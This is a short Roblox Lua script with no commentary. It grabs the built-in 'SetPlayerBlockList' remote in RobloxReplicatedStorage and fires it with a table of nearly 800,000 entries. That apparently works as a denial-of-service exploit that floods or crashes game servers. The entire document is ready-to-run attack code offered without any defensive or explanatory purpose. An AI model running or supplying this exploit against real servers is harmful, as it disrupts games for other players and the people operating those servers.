local remote = game:FindFirstChild("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
local entries = 799999
local payload = table.create(entries)

for i = 1, entries do
    payload[i] = { id = i, v = i * 2 }
end

remote:FireServer(payload)
